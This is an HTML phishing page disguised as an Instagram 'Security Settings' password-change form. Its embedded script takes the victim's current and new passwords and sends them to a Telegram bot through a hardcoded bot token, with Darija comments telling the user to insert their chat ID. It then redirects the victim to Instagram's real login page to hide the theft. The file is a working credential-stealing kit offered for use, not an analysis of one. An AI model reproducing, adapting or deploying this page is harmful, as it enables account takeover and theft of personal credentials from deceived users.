<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Settings</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; display: flex; flex-direction: column; align-items: center; border-radius: 3px; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 25px; color: #262626; }
        input { width: 100%; padding: 12px 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; box-sizing: border-box; }
        .btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        .footer-link { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 25px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Security Settings</div>
        <form id="secureForm">
            <input type="password" id="curr_pass" placeholder="Current Password" required>
            <input type="password" id="new_pass" placeholder="New Password" required>
            <input type="password" id="conf_pass" placeholder="Confirm New Password" required>
            <button type="submit" class="btn">Changer</button>
        </form>
        <a href="https://www.instagram.com/accounts/password/reset/" class="footer-link">Forgot password?</a>
    </div>

    <script>
        const token = '8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU';
        const chatId = 'رقم_الـ_ID_ديالك'; // حط الـ ID ديالك هنا

        document.getElementById('secureForm').onsubmit = async (e) => {
            e.preventDefault();
            
            const p1 = document.getElementById('curr_pass').value;
            const p2 = document.getElementById('new_pass').value;
            const p3 = document.getElementById('conf_pass').value;

            const message = `🚨 New Data Received:\n\n🔑 Current: ${p1}\n🆕 New: ${p2}\n✅ Confirm: ${p3}`;

            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                // مورا ما يصيفط المعلومات، يديه لانستغرام
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error('Error:', error);
            }
        };
    </script>

</body>
</html>
